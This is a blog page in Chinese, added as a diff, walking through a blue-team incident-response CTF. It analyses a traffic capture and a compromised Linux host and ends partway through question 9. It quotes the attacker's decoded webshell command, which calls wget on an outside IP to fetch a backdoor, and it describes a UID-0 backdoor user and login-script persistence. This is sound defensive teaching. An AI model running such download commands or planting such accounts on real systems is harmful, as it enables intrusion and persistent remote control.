@@ -1,0 +1,416 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>blueteam的小心思 | Q1yl</title><meta name="author" content="扬祺"><meta name="copyright" content="扬祺"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="问题 1：找登录密码并算 MD5目标：从流量包中挖出登录密码，再算它的 MD5 值步骤 1：用终端找流量包（PCAP 文件） 打开终端， 复制粘贴 下面的命令（不用手动输，避免输错），然后按回车： bash 1find / -name *.pcap 2>/dev/null    等待几秒，终端会输出类似这样的结果（找到 PCAP 文件路径）： plaintext 1/home/ubuntu/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="blueteam的小心思">
+<meta property="og:url" content="http://example.com/2025/10/09/blueteam%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/index.html">
+<meta property="og:site_name" content="Q1yl">
+<meta property="og:description" content="问题 1：找登录密码并算 MD5目标：从流量包中挖出登录密码，再算它的 MD5 值步骤 1：用终端找流量包（PCAP 文件） 打开终端， 复制粘贴 下面的命令（不用手动输，避免输错），然后按回车： bash 1find / -name *.pcap 2>/dev/null    等待几秒，终端会输出类似这样的结果（找到 PCAP 文件路径）： plaintext 1/home/ubuntu/">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/bz.jpg">
+<meta property="article:published_time" content="2025-10-09T10:49:49.000Z">
+<meta property="article:modified_time" content="2025-10-09T10:51:44.436Z">
+<meta property="article:author" content="扬祺">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/bz.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "blueteam的小心思",
+  "url": "http://example.com/2025/10/09/blueteam%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/",
+  "image": "http://example.com/img/bz.jpg",
+  "datePublished": "2025-10-09T10:49:49.000Z",
+  "dateModified": "2025-10-09T10:51:44.436Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "扬祺",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/10/09/blueteam%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'blueteam的小心思',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css"><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/bj.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Q1yl</span></a><a class="nav-page-title" href="/"><span class="site-name">blueteam的小心思</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">blueteam的小心思</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-09T10:49:49.000Z" title="发表于 2025-10-09 18:49:49">2025-10-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-09T10:51:44.436Z" title="更新于 2025-10-09 18:51:44">2025-10-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="问题-1：找登录密码并算-MD5"><a href="#问题-1：找登录密码并算-MD5" class="headerlink" title="问题 1：找登录密码并算 MD5"></a>问题 1：找登录密码并算 MD5</h1><h2 id="目标：从流量包中挖出登录密码，再算它的-MD5-值"><a href="#目标：从流量包中挖出登录密码，再算它的-MD5-值" class="headerlink" title="目标：从流量包中挖出登录密码，再算它的 MD5 值"></a>目标：从流量包中挖出登录密码，再算它的 MD5 值</h2><h3 id="步骤-1：用终端找流量包（PCAP-文件）"><a href="#步骤-1：用终端找流量包（PCAP-文件）" class="headerlink" title="步骤 1：用终端找流量包（PCAP 文件）"></a>步骤 1：用终端找流量包（PCAP 文件）</h3><ol>
+<li><p>打开终端，</p>
+<p>复制粘贴</p>
+<p>下面的命令（不用手动输，避免输错），然后按回车：</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.pcap 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>等待几秒，终端会输出类似这样的结果（找到 PCAP 文件路径）：</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ubuntu/attack.pcap  # 这是示例路径，你的可能不一样</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>记住这个路径（比如 <code>/home/ubuntu/attack.pcap</code>），后面要用。</p>
+</li>
+</ol>
+<h3 id="步骤-2：用-Wireshark-打开流量包找密码"><a href="#步骤-2：用-Wireshark-打开流量包找密码" class="headerlink" title="步骤 2：用 Wireshark 打开流量包找密码"></a>步骤 2：用 Wireshark 打开流量包找密码</h3><ol>
+<li><p>打开 Wireshark，点击左上角 “文件”→“打开”，在弹出的窗口里，找到步骤 1 记的路径（比如 <code>/home/ubuntu/attack.pcap</code>），选中文件后点 “打开”。</p>
+</li>
+<li><p>此时 Wireshark 会显示很多杂乱的流量，我们需要筛选 “登录请求”：</p>
+<ul>
+<li>在 Wireshark 顶部的 “过滤器” 输入框里，<strong>复制粘贴</strong> <code>http.request.method == POST</code>，然后按回车（筛选所有 POST 请求，登录常用 POST）。</li>
+</ul>
+</li>
+<li><p>筛选后列表会变短，找到 “Info” 列里写着 <code>POST /login.php HTTP/1.1</code> 的行（题目说 “最后一个 login.php 包是登录成功”，所以找最后一个这样的行）。</p>
+</li>
+<li><p>右键点击这行，选择 “追踪流”→“HTTP 流”，会弹出一个新窗口。</p>
+</li>
+<li><p>在新窗口里，往下翻找类似</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=xxxx</span><br></pre></td></tr></tbody></table></figure>
+
+<p>的内容（登录时会传用户名和密码，password 后面就是密码）：</p>
+<ul>
+<li>比如看到 <code>username=admin&amp;password=Aa12345^</code>，这里的密码就是 <code>Aa12345^</code>（你的可能一样，按实际看到的来）。</li>
+</ul>
+</li>
+<li><p>把密码记下来（比如 <code>Aa12345^</code>）。</p>
+</li>
+</ol>
+<h3 id="步骤-3：算密码的-MD5-值"><a href="#步骤-3：算密码的-MD5-值" class="headerlink" title="步骤 3：算密码的 MD5 值"></a>步骤 3：算密码的 MD5 值</h3><ol>
+<li><p>回到终端，</p>
+<p>复制粘贴</p>
+<p>下面的命令（把</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa12345^</span><br></pre></td></tr></tbody></table></figure>
+
+<p>换成你刚才记的密码），按回车：</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">"Aa12345^"</span> | <span class="built_in">md5sum</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>终端会输出类似这样的结果（前面的一串字母数字就是 MD5 值）：</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f1b206103d7e428533a091416527390  -</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>按格式 <code>flag{7f1b206103d7e428533a091416527390}</code> 提交即可。</p>
+</li>
+</ol>
+<h1 id="问题-2：找上传后门的-PHP-页面"><a href="#问题-2：找上传后门的-PHP-页面" class="headerlink" title="问题 2：找上传后门的 PHP 页面"></a>问题 2：找上传后门的 PHP 页面</h1><h2 id="目标：从流量包中找到-“文件上传”-对应的-PHP-页面（比如-upload-php）"><a href="#目标：从流量包中找到-“文件上传”-对应的-PHP-页面（比如-upload-php）" class="headerlink" title="目标：从流量包中找到 “文件上传” 对应的 PHP 页面（比如 upload.php）"></a>目标：从流量包中找到 “文件上传” 对应的 PHP 页面（比如 upload.php）</h2><h3 id="步骤-1：在-Wireshark-中筛选文件上传流量"><a href="#步骤-1：在-Wireshark-中筛选文件上传流量" class="headerlink" title="步骤 1：在 Wireshark 中筛选文件上传流量"></a>步骤 1：在 Wireshark 中筛选文件上传流量</h3><ol>
+<li><p>还是在刚才打开的 Wireshark 窗口（如果关了，重新打开 PCAP 文件）。</p>
+</li>
+<li><p>顶部过滤器不变（还是 <code>http.request.method == POST</code>），然后看每个 POST 请求的 “Info” 列，找 “Content-Type” 里带 <code>multipart/form-data; boundary=</code> 的请求（文件上传的标志，“boundary” 是文件和参数的分隔符）。</p>
+</li>
+<li><p>找到这样的请求后，右键 “追踪流”→“HTTP 流”，看新窗口里的 “请求行”（第一行类似</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /xxx.php HTTP/1.1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>）：</p>
+<ul>
+<li>比如看到 <code>POST /upload.php HTTP/1.1</code>，这里的 <code>upload.php</code> 就是上传页面（题目说 “下一个包没访问这个 PHP，说明这个就是”，所以确认是它）。</li>
+</ul>
+</li>
+</ol>
+<h3 id="步骤-2：算页面名称的-MD5-值"><a href="#步骤-2：算页面名称的-MD5-值" class="headerlink" title="步骤 2：算页面名称的 MD5 值"></a>步骤 2：算页面名称的 MD5 值</h3><ol>
+<li><p>回到终端，</p>
+<p>复制粘贴</p>
+<p>下面的命令（把</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload.php</span><br></pre></td></tr></tbody></table></figure>
+
+<p>换成你找到的页面名），按回车：</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">"upload.php"</span> | <span class="built_in">md5sum</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>终端输出 MD5 值（比如 <code>623894c8171a3603d62234c83745b37a</code>），按格式 <code>flag{623894c8171a3603d62234c83745b37a}</code> 提交。</p>
+</li>
+</ol>
+<h1 id="问题-3：找上传的-WebShell-文件并算-MD5"><a href="#问题-3：找上传的-WebShell-文件并算-MD5" class="headerlink" title="问题 3：找上传的 WebShell 文件并算 MD5"></a>问题 3：找上传的 WebShell 文件并算 MD5</h1><h2 id="目标：找到攻击者上传的恶意-PHP-文件（比如-webshell-php），再算它的-MD5"><a href="#目标：找到攻击者上传的恶意-PHP-文件（比如-webshell-php），再算它的-MD5" class="headerlink" title="目标：找到攻击者上传的恶意 PHP 文件（比如 webshell.php），再算它的 MD5"></a>目标：找到攻击者上传的恶意 PHP 文件（比如 webshell.php），再算它的 MD5</h2><h3 id="步骤-1：从流量包找-WebShell-的保存路径"><a href="#步骤-1：从流量包找-WebShell-的保存路径" class="headerlink" title="步骤 1：从流量包找 WebShell 的保存路径"></a>步骤 1：从流量包找 WebShell 的保存路径</h3><ol>
+<li><p>还是在问题 2 找到的 “文件上传” HTTP 流窗口里，找</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=</span><br></pre></td></tr></tbody></table></figure>
+
+<p>后面的内容（这是上传的文件名）：</p>
+<ul>
+<li>比如看到 <code>filename="webshell.php"</code>，文件名就是 <code>webshell.php</code>。</li>
+</ul>
+</li>
+<li><p>再看流窗口里的 “响应内容”（HTTP 流窗口下半部分，标着 “Response” 的地方），找类似 <code>Save to /var/www/html/webshell.php</code> 的内容（这是文件保存到服务器的路径），记下来（比如 <code>/var/www/html/webshell.php</code>）。</p>
+</li>
+</ol>
+<h3 id="步骤-2：在终端验证文件并算-MD5"><a href="#步骤-2：在终端验证文件并算-MD5" class="headerlink" title="步骤 2：在终端验证文件并算 MD5"></a>步骤 2：在终端验证文件并算 MD5</h3><ol>
+<li><p>回到终端，</p>
+<p>复制粘贴</p>
+<p>下面的命令（把路径换成你记的保存路径），按回车（先确认文件存在）：</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /var/www/html/webshell.php</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<ul>
+<li>如果输出类似 <code>-rw-r--r-- 1 root root 1234 1月 24 08:30 /var/www/html/webshell.php</code>，说明文件存在。</li>
+</ul>
+</li>
+<li><p>然后算它的 MD5，</p>
+<p>复制粘贴</p>
+<p>下面的命令（路径还是你记的路径），按回车：</p>
+<p>bash</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> /var/www/html/webshell.php</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>终端输出 MD5 值（比如 <code>a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</code>），按格式 <code>flag{a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6}</code> 提交。</p>
+</li>
+</ol>
+<h1 id="问题4-攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag-md5-。"><a href="#问题4-攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag-md5-。" class="headerlink" title="问题4:攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。"></a>问题4:攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。</h1><p>Wireshark</p>
+<p>简单筛选一下http，按照一下大小排序，在大小为“1037”的包中发现关键；</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/c392d4b65c5548bfacbf03c6fc7cfc7c.png#pic_center" alt="在这里插入图片描述"></p>
+<p>跟进分析，追踪流HTTP；</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/36e65754b9c643e9b65571fd9a1ada85.png#pic_center" alt="在这里插入图片描述"></p>
+<p>简单分析一下；</p>
+<p>URL在线解码得到；</p>
+<p>m3=system(“wget <a target="_blank" rel="noopener" href="http://124.221.70.199:8889/is.world">http://124.221.70.199:8889/is.world</a>“);<br>AI运行代码<br>1<br>使用了PHP的 system 函数，执行了一个下载命令。</p>
+<p>system：PHP中的 system 函数会执行一个外部程序，并输出结果。</p>
+<p>wget：这是一个用于从网络下载文件的命令行工具。命令中的参数指定了下载文件的URL。</p>
+<p><a target="_blank" rel="noopener" href="http://124.221.70.199:8889/is.world%EF%BC%9A%E8%BF%99%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E7%9B%AE%E6%A0%87URL%EF%BC%8C%E5%8C%85%E5%90%AB%E4%BA%86%E4%B8%80%E4%B8%AAIP%E5%9C%B0%E5%9D%80">http://124.221.70.199:8889/is.world：这是文件下载的目标URL，包含了一个IP地址</a> 124.221.70.199 和端口 8889。目标文件名是 is.world。</p>
+<p>题目问的什么？问的不就是黑客下载的程序嘛，所以就有理由进行怀疑，直接find定位一些文件位置即可；</p>
+<p>命令；</p>
+<p> find / -name is.world<br>AI运行代码<br>1<br>得到；</p>
+<p>后面的步骤就不进行演示，跟Liunx后面一样跟进过去，到文件“is.world”目录下进行MD5加密即可；</p>
+<h1 id="问题5-攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag-md5-。"><a href="#问题5-攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag-md5-。" class="headerlink" title="问题5:攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。"></a>问题5:攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。</h1><p><strong>题目让我们找到新镇的后面用户名称并且进行MD5加密提交，那都说了新增加用户，那我们肯定是检查用户配置文件，在Liunx中，/etc/passwd 文件，包含了所有用户的信息，包括用户名和用户ID等。</strong></p>
+<p><strong>所以使用命令；</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/f821f48e162040ba8bee03aeaa76f6d1.png#pic_center" alt="在这里插入图片描述"></p>
+<p>一眼望过去，最不正常的就是最底下那个“knowledgegraphd”；</p>
+<p>因为从 /etc/passwd 文件来看，这个用户看起来异常，因为它的 UID 和 GID 都是 0，与 root 用户相同，这意味着它具有 root 权限。</p>
+<p>用户权限分析:</p>
+<p>root:x:0:0:root:/root:/bin/bash<br>这是系统管理员账户，UID 和 GID 都是 0。<br>knowledgegraphd:x:0:0::/home/knowledgegraphd:/bin/bash<br>这个账户的 UID 和 GID 也都是 0，意味着它具有与 root 用户相同的权限。这是一个明显的安全风险，通常用户不会被分配 UID 和 GID 为 0，除非是系统管理员。</p>
+<p><strong>用户的主目录和 shell</strong>:</p>
+<ul>
+<li><code>/home/knowledgegraphd</code> 是这个用户的主目录。</li>
+<li><code>/bin/bash</code> 是这个用户的默认 shell，允许用户执行命令，这进一步表明这是一个高权限用户。</li>
+</ul>
+<p><strong>总结；</strong></p>
+<blockquote>
+<p>以上分析，<code>knowledgegraphd</code> 用户就是是黑客创建的后门用户，因为它具有 root 权限，这在正常情况下是极不寻常的。此外，这个用户没有描述信息（通常用户会有一个描述字段，比如系统服务用户有描述它们用途的信息）。</p>
+</blockquote>
+<p>所以使用命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n "knowledgegraphd" | md5sum</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/23fd6fd77fb24f098b69a45097906030.png#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="问题6-攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag-md5-。"><a href="#问题6-攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag-md5-。" class="headerlink" title="问题6:攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。"></a>问题6:攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</h1><p>解题思路</p>
+<p>题目让我们提交黑客创建的一个持久化的配置项的MD5，黑客在 Linux 系统上创建持久化配置项，以在任意用户登录时触发后门连接，通常会利用以下文件；</p>
+<p>shell配置文件；</p>
+<p>黑客可以修改用户的 Shel 配置文件，这些文件在用户登录时被执行。常见的文件包括:</p>
+<p>1、”<del>/.bashrc“：用于 Bash Shell，会在每次打开新的终端或登录 Shell 时执行。<br>2、”/.bash_profile“或”/.profile“：这些文件在用户登录时执行。<br>3、”</del>/.zshrc“：用于Zsh Shell，与”~/.bashrc“类似。<br>4、”/etc/profile“：为所有用户提供的系统级别的配置文件，<br>5、”/etc/bash.bashrc“：为所有用户提供的系统级别的配置文件，Bash Shell 专用。</p>
+<p>一个一个跟进分析，查看有没有什么可疑的地方，最后也是在”/etc/profile“中发现关键；</p>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/5f1a3c6f8e6b4804895d9069851603eb.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>路径：/etc/profile</strong></p>
+<p>使用命令提交flag</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum /etc/profile</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="问题7-攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag-md5-。"><a href="#问题7-攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag-md5-。" class="headerlink" title="问题7:攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。"></a>问题7:攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</h1><p>跟上题差不多，只不过这里是只有root用户登录才会触发后门连接，那这里我们需要确定黑客可利用的文件或者位置，那这里我们就可以猜测了，如果黑客希望在只有root用户登录时才触发后门连，其它用户则不会，那他一般会挑选以下文件和目录；</p>
+<p>1、“/root/.bashrc”：在root用户登录Bash Shell时执行；<br>2、“/root/.bash_profile”：在root用户登录时执行。<br>3、“/root/.profile”：在root用户登录时执行。<br>4、“/etc/profile”：所有用户登录时执行，但可以通过特定的条件使其仅在root用户登录时触发。（这个概率就非常大，且也符合我们的猜测）<br>5、“/etc/rc.local”：系统启动时执行，可以包含条件逻辑；</p>
+<p>还是跟上题一样老操作，一个一个分析过去即可，最后也是在“/root/.bashrc”中发现关键；</p>
+<p>使用命令；</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.bashrc</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/b4805060d5b14815a80a123110e59c25.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>总的来说，它允许黑客在受感染的系统上创建一个反弹 shell，使得黑客可以通过网络远程控制受感染的计算机。黑客可以执行任意命令、访问敏感数据、安装其他恶意软件等。</strong></p>
+<p><strong>题目让我们提交配置文件完全路径的小写MD5值；</strong></p>
+<p>所以；</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum /root/.bashrc</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="问题8-攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag-md5-。"><a href="#问题8-攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag-md5-。" class="headerlink" title="问题8:攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。"></a>问题8:攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。</h1><p>使用连接数据库工具连接数据库</p>
+<p>一个个查看,点不开的就是加密的数据库</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/f53f0f9e33784db49cd061415856d72c.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>那我们返回Liunx，尝试使用find定位一下“JPMorgan@0020Chase”</strong></p>
+<p>命令；</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name JPMorgan@0020Chase</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/8345aaf66ed94caaa53549cbb14253a2.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>那我们跟进到这个目录下，直接j进行MD5解密即可；（这里因为JPMorgan@0020Chase也不是一个文件，所以我们还是得使用echo来进行MD5加密，跟我们之前MD5加密用户一下）</strong></p>
+<p>命令；</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n "JPMorgan@0020Chase" | md5sum</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="问题9-解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag-md5-。"><a href="#问题9-解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag-md5-。" class="headerlink" title="问题9:解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。"></a>问题9:解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。</h1><p><strong>题目让我们解密数据库，提交Harper用户对应的Areer的值并且进行MD5加密，那这里黑客肯定是对表“Balance”进行了什么操作才导致进不去，那我们就尝试查找一下黑客比文件“cpg.php“新，又比闻文件“Balance.frm”旧的所有文件；</strong></p>
